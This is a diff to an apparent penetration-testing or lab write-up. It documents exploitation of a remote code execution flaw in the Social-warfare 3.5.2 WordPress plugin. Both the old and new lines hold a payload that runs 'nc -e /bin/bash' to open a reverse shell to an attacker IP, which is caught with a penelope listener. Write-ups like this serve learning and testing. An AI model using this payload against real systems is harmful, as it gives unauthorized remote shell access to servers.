@@ -164,8 +164,14 @@ Enumerated top 200 UDP ports:
 
 # Exploitation
 ## Name of the technique
+## Social-warfare 3.5.2 unathenticated remote code execution
 
-#### -Typed vim payload.txt and changed the cat etc/passwd script with "<pre>system('nc -e /bin/bash 192.168.49.213 5002')</pre>" and ran penelope program (which is better than netcat listener) which automatically upgrades the TTY terminal and received reverse shell: 
+#### -Typed vim payload.txt and changed the cat etc/passwd script with "<pre>system('nc -e /bin/bash 192.168.49.213 5002')</pre>" and ran penelope listener and received reverse shell: 
+
+![](Pasted%20image%2020221018222630.png)
+
+![](Pasted%20image%2020221018222721.png)
+
 ---
 
 # Lateral Movement to user
